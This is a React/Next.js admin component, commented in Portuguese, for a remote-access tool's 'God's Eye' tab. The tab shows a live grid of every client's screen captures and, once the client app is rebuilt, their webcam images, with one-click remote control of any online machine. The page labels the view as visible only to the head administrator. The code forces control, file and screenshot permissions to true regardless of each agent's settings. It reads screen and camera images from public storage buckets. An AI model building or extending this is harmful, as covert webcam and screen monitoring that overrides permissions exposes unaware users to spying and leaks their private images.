"use client";

import { useCallback, useEffect, useState } from "react";
import { Eye, Monitor, Video, RefreshCw, Search, X } from "lucide-react";
import { supabase } from "@/lib/supabase-client";
import RemoteViewer from "@/components/RemoteViewer";
import type { RemoteAgent } from "@/lib/types";

type Row = { id: string; name: string; os: string | null; status: string | null; last_seen: string | null; company_id: string | null; company_name: string | null };

const THUMB = `${process.env.NEXT_PUBLIC_SUPABASE_URL ?? ""}/storage/v1/object/public/agent-thumbs`;
const CAM = `${process.env.NEXT_PUBLIC_SUPABASE_URL ?? ""}/storage/v1/object/public/agent-cams`;

function online(r: Row) {
  return r.status === "online" && !!r.last_seen && Date.now() - new Date(r.last_seen).getTime() < 120000;
}
function toFull(r: Row): RemoteAgent {
  return {
    id: r.id, company_id: r.company_id, client_id: null, name: r.name, access_code: "", pin: null,
    status: r.status ?? "offline", os: r.os, last_seen: r.last_seen, created_by: null,
    created_at: new Date().toISOString(), specs: null, is_server: false, server_root: null,
    graph_folder_id: null, shared_paths: null, allow_control: true, allow_files: true, allow_screenshot: true,
  };
}

// GOD'S EYE — só o Administrador Geral. Grade ao vivo das telas (e, quando o
// agente enviar, das câmeras) de TODOS os clientes. Filtra tela×câmera, expande
// e acessa o computador.
export default function GodsEyeTab() {
  const [rows, setRows] = useState<Row[]>([]);
  const [loading, setLoading] = useState(true);
  const [tick, setTick] = useState(0);
  const [filter, setFilter] = useState<"tela" | "camera">("tela");
  const [q, setQ] = useState("");
  const [expanded, setExpanded] = useState<Row | null>(null);
  const [viewing, setViewing] = useState<RemoteAgent | null>(null);

  const load = useCallback(async () => {
    if (!supabase) return;
    const { data } = await supabase.rpc("admin_all_agents");
    setRows((data as Row[]) ?? []);
    setLoading(false);
  }, []);
  useEffect(() => { load(); }, [load]);
  // Atualiza as prévias a cada 5s (o agente sobe um print nesse ritmo).
  useEffect(() => { const i = setInterval(() => setTick((t) => t + 1), 5000); return () => clearInterval(i); }, []);

  const list = rows.filter((r) => `${r.name} ${r.company_name ?? ""} ${r.os ?? ""}`.toLowerCase().includes(q.toLowerCase()));
  const onlineCount = rows.filter(online).length;
  const src = (r: Row) => `${filter === "camera" ? CAM : THUMB}/${r.id}.jpg?v=${tick}`;

  return (
    <div className="h-full overflow-y-auto custom-scroll p-4 md:p-6">
      <div className="max-w-6xl mx-auto">
        <div className="flex items-center justify-between gap-3 flex-wrap mb-1">
          <h2 className="text-lg font-bold flex items-center gap-2"><Eye size={20} className="text-red-400" /> God&apos;s Eye</h2>
          <button onClick={load} className="p-2 rounded-lg hover:bg-white/10 cursor-pointer text-gray-300" title="Atualizar lista"><RefreshCw size={15} /></button>
        </div>
        <p className="text-[12px] text-gray-400 mb-3">Telas ao vivo de todos os clientes. {onlineCount} online. Só você vê isto.</p>

        <div className="flex items-center gap-2 mb-4 flex-wrap">
          <div className="flex bg-black/20 border border-white/10 rounded-lg p-0.5">
            <button onClick={() => setFilter("tela")} className={`text-xs px-3 py-1.5 rounded-md cursor-pointer flex items-center gap-1.5 ${filter === "tela" ? "bg-red-600/40 text-red-200" : "text-gray-400"}`}><Monitor size={13} /> Tela</button>
            <button onClick={() => setFilter("camera")} className={`text-xs px-3 py-1.5 rounded-md cursor-pointer flex items-center gap-1.5 ${filter === "camera" ? "bg-red-600/40 text-red-200" : "text-gray-400"}`}><Video size={13} /> Câmera</button>
          </div>
          <div className="flex items-center gap-2 bg-black/20 rounded-lg px-3 py-1.5 flex-1 max-w-xs">
            <Search size={14} className="text-gray-400" />
            <input value={q} onChange={(e) => setQ(e.target.value)} placeholder="Buscar máquina/empresa…" className="bg-transparent outline-none text-sm w-full" />
          </div>
        </div>

        {filter === "camera" && (
          <p className="text-[11px] text-amber-300/80 mb-3 bg-amber-950/20 border border-amber-800/40 rounded-lg px-3 py-2">
            As câmeras aparecem aqui assim que o agente atualizado começar a enviar a imagem da câmera. (Precisa do rebuild do app do cliente.)
          </p>
        )}

        {loading ? <p className="text-sm text-gray-500 text-center py-10">Carregando…</p> : list.length === 0 ? (
          <p className="text-sm text-gray-500 text-center py-10">Nenhuma máquina encontrada.</p>
        ) : (
          <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3">
            {list.map((r) => {
              const on = online(r);
              return (
                <button key={r.id} onClick={() => setExpanded(r)} className="group text-left rounded-xl overflow-hidden border border-white/10 bg-black/30 hover:border-red-500/40 cursor-pointer">
                  <div className="aspect-video bg-black relative">
                    {on ? (
                      // eslint-disable-next-line @next/next/no-img-element
                      <img src={src(r)} alt={r.name} className="w-full h-full object-cover" onError={(e) => { (e.currentTarget.style.opacity = "0.15"); }} />
                    ) : (
                      <div className="w-full h-full flex items-center justify-center text-gray-600 text-xs">offline</div>
                    )}
                    <span className={`absolute top-1.5 left-1.5 w-2 h-2 rounded-full ${on ? "bg-emerald-400" : "bg-gray-600"}`} />
                  </div>
                  <div className="px-2 py-1.5">
                    <p className="text-xs font-semibold truncate">{r.name}</p>
                    <p className="text-[10px] text-gray-500 truncate">{r.company_name} · {r.os || "?"}</p>
                  </div>
                </button>
              );
            })}
          </div>
        )}
      </div>

      {/* Expandido: prévia grande + acessar computador */}
      {expanded && (
        <div className="fixed inset-0 z-[85] bg-black/80 flex items-center justify-center p-4" onClick={() => setExpanded(null)}>
          <div className="w-full max-w-3xl bg-[#0b0f16] border border-white/10 rounded-2xl overflow-hidden" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between px-4 py-3 border-b border-white/10">
              <div className="min-w-0">
                <h3 className="text-sm font-bold truncate">{expanded.name}</h3>
                <p className="text-[11px] text-gray-500 truncate">{expanded.company_name} · {expanded.os || "?"} · {online(expanded) ? "online" : "offline"}</p>
              </div>
              <button onClick={() => setExpanded(null)} className="p-1.5 rounded-lg hover:bg-white/10 cursor-pointer text-gray-300"><X size={16} /></button>
            </div>
            <div className="aspect-video bg-black">
              {online(expanded) ? (
                // eslint-disable-next-line @next/next/no-img-element
                <img src={src(expanded)} alt={expanded.name} className="w-full h-full object-contain" />
              ) : (
                <div className="w-full h-full flex items-center justify-center text-gray-600">Máquina offline</div>
              )}
            </div>
            <div className="p-3 flex justify-end">
              <button
                onClick={() => { const a = toFull(expanded); setExpanded(null); setViewing(a); }}
                disabled={!online(expanded)}
                className="text-sm px-4 py-2 rounded-lg bg-red-600 hover:bg-red-500 text-white cursor-pointer disabled:opacity-40 flex items-center gap-2"
              >
                <Monitor size={15} /> Acessar computador
              </button>
            </div>
          </div>
        </div>
      )}

      {viewing && <RemoteViewer agent={viewing} onClose={() => setViewing(null)} />}
    </div>
  );
}
